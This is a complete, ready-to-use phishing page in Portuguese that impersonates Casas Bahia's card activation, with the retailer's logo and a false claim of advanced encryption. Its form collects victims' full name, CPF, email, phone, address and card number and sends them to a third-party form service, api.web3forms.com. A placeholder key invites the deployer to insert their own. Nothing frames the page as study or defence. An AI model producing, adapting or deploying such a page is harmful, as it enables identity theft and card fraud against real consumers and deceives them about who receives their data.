<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cartão Casas Bahia - Ativação</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
      text-align: center;
    }
    .container {
      background-color: white;
      max-width: 400px;
      margin: 40px auto;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
    }
    h1 {
      color: #0054a6;
    }
    input, button {
      width: 90%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      background-color: #0054a6;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background-color: #003f7f;
    }
    small {
      font-size: 12px;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://logodownload.org/wp-content/uploads/2020/03/casas-bahia-logo-1.png" width="180" alt="Casas Bahia">
    <h1>Confirme seus dados</h1>
    <p>Seu cartão digital Casas Bahia já está pronto para ativação.</p>

    <form action="https://api.web3forms.com/submit" method="POST">
      <input type="hidden" name="access_key" value="TROCA-ESSA-KEY-PELA-TUA-WEB3FORMS">
      <input type="text" name="nome" placeholder="Nome completo" required>
      <input type="text" name="cpf" placeholder="CPF" required>
      <input type="email" name="email" placeholder="E-mail" required>
      <input type="tel" name="telefone" placeholder="Telefone" required>
      <input type="text" name="endereco" placeholder="Endereço" required>
      <input type="text" name="cartao" placeholder="Número do cartão (opcional)">
      <button type="submit">Ativar Cartão</button>
      <small>Processo 100% seguro com criptografia avançada</small>
    </form>
  </div>
</body>
</html>
